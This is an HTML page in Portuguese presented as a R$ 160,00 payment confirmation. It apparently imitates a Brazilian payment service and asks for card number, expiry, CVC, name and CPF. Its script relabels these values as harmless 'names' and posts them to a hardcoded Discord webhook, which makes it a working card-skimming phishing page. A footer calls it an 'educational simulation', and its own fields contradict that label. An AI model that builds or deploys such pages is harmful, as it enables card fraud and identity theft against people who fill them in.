<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Pagamento</title>

<style>
*{ box-sizing:border-box; }

body{
  margin:0;
  background:#f2f4f6;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
}

/* HEADER */
.header{
  background:#009ee3;
  color:#fff;
  padding:16px;
  text-align:center;
}
.header h1{ font-size:17px; margin:0; font-weight:600; }
.header .value{ font-size:26px; font-weight:700; margin-top:6px; }

/* CARD */
.card{
  max-width:380px;
  margin:16px auto;
  background:#fff;
  border-radius:16px;
  padding:20px;
  box-shadow:0 10px 28px rgba(0,0,0,.12);
}

/* INPUTS */
label{ font-size:13px; color:#333; margin-top:14px; display:block; }
input{
  width:100%;
  padding:14px;
  margin-top:6px;
  border-radius:12px;
  border:1px solid #d7d7d7;
  font-size:15px;
  outline:none;
}
input:focus{
  border-color:#009ee3;
  box-shadow:0 0 0 2px rgba(0,158,227,.15);
}
.row{ display:flex; gap:10px; }

/* BUTTON */
button{
  width:100%;
  margin-top:24px;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#009ee3;
  color:#fff;
  font-size:16px;
  font-weight:700;
  cursor:pointer;
}

/* NOTE */
.note{ margin-top:14px; font-size:12px; text-align:center; color:#777; }

/* SKELETON */
.skeleton{
  background:linear-gradient(100deg,#e4e4e4 30%,#f5f5f5 40%,#e4e4e4 50%);
  background-size:200% 100%;
  animation:shimmer 1.2s infinite;
  border-radius:12px;
}
@keyframes shimmer{ to{ background-position:-200% 0 } }
.skel-input{ height:50px; margin-top:12px; }
.skel-small{ height:50px; flex:1; }

/* STATES */
.hidden{ display:none; }
.center{ text-align:center; padding:30px 10px; color:#555; }
</style>
</head>

<body>

<div class="header">
  <h1>Confirmar pagamento</h1>
  <div class="value">R$ 160,00</div>
</div>

<div class="card">

  <!-- LOADING FRAMES -->
  <div id="loading" class="center">
    <div class="skeleton skel-input"></div>
    <div class="skeleton skel-input"></div>
    <div class="row">
      <div class="skeleton skel-small"></div>
      <div class="skeleton skel-small"></div>
    </div>
    <div class="skeleton skel-input"></div>
    <div class="skeleton skel-input"></div>
    <p>Preparando pagamento‚Ä¶</p>
  </div>

  <!-- FORM -->
  <div id="form" class="hidden">

    <label>N√∫mero do cart√£o</label>
    <input id="nome1" placeholder="123456789">

    <div class="row">
      <div>
        <label>Validade</label>
        <input id="nome2" placeholder="00/00">
      </div>
      <div>
        <label>CVC</label>
        <input id="nome3" placeholder="123">
      </div>
    </div>

    <label>Nome</label>
    <input id="nome4" placeholder="Digite o nome">

    <label>CPF</label>
    <input id="nome5" placeholder="Digite o cpf">

    <button onclick="enviar()">Confirmar</button>

    <div class="note">Simula√ß√£o educacional ‚Ä¢ Apenas nomes</div>
  </div>

</div>

<script>
/* Loading inicial */
setTimeout(()=>{
  loading.classList.add("hidden");
  form.classList.remove("hidden");
}, 2000);

function enviar(){
  const nomes = [
    nome1.value.trim(),
    nome2.value.trim(),
    nome3.value.trim(),
    nome4.value.trim(),
    nome5.value.trim()
  ];
  if(nomes.some(n=>!n)){
    alert("Preencha todos os nomes");
    return;
  }

  form.classList.add("hidden");
  loading.classList.remove("hidden");
  document.querySelector(".center p").innerText = "Processando‚Ä¶";

  const payload = {
    content:
`üßæ **Pagamento Simulado**
üí∞ Valor: **R$ 160,00**

üë§ Nome 1: ${nomes[0]}
üë§ Nome 2: ${nomes[1]}
üë§ Nome 3: ${nomes[2]}
üë§ Nome 4: ${nomes[3]}
üë§ Nome 5: ${nomes[4]}

üìÖ ${new Date().toLocaleString("pt-BR")}`
  };

  fetch("https://discord.com/api/webhooks/1338149913531252820/trWQa4mRCRCVjKH-E0ozrddh8e5lL9OX6jRQo1td9kx96RZ-W-iABvEFzegak3BkuJkc",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify(payload)
  })
  .then(()=>{ document.querySelector(".center p").innerText="Enviado ‚úîÔ∏è"; })
  .catch(()=>{ document.querySelector(".center p").innerText="Erro no envio"; });
}
</script>

</body>
</html>
